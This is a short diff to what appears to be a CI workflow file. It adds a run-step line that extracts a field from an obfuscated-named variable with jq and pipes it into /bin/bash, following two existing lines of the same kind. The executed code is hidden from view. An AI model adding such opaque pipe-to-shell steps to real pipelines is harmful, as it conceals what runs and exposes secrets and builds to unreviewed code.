@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$lvp2344" | jq -r .efbbb6 | /bin/bash
           echo $dmnyx02 | jq -r .bber44326 | /bin/bash
+          echo $rowdf5 | jq -r .esx3287 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
